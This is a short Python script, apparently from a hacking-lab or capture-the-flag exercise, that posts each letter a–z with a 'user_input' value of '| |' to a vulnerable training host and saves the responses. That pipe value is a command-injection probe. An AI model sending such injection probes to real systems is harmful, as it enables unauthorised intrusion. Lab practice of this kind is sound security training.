import requests

docker_url = "https://fe77bf2d-22cf-4897-9d5f-d2537e6926fa.idocker.vuln.land/"

with open('res.html', 'w') as fi:
    for i in range(26):
        char = chr(97 + i)
        data = {
            'alphabet_select': char,
            'user_input': '| |'
        }

        with requests.post(docker_url, data=data) as resp:
            fi.write(resp.text + '<br>')
